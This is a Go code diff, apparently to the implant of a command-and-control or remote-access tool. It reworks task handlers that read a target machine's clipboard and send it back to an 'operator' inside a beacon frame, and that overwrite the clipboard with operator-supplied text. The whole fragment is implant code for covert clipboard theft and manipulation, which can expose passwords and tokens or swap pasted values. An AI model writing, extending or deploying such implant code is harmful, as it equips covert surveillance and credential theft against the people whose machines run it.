@@ -263,19 +263,30 @@ func handleClipboardGet(task Task, res *TaskResult) {
 	out, err := clipboardGet()
 	if err != nil {
 		res.Error = err.Error()
-	} else {
-		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-		res.Encoding = "base64"
+		return
+	}
+	// Bound the read: a clipboard holding a screenshot would otherwise put
+	// megabytes of base64 into a beacon frame. A truncated read is marked so
+	// the operator does not mistake it for the whole value.
+	text, truncated := sanitizeClipboardText(out)
+	res.Output = base64.StdEncoding.EncodeToString([]byte(text))
+	res.Encoding = "base64"
+	if truncated {
+		res.Error = "clipboard truncated to 64 KiB"
 	}
 }
 
 func handleClipboardSet(task Task, res *TaskResult) {
-	err := clipboardSet(task.Command)
+	text, err := prepareClipboardWrite(task.Command)
 	if err != nil {
 		res.Error = err.Error()
-	} else {
-		res.Output = "clipboard set"
+		return
 	}
+	if err := clipboardSet(text); err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = "clipboard set"
 }
 
 // ── Search / Registry ───────────────────────────────────────────────────
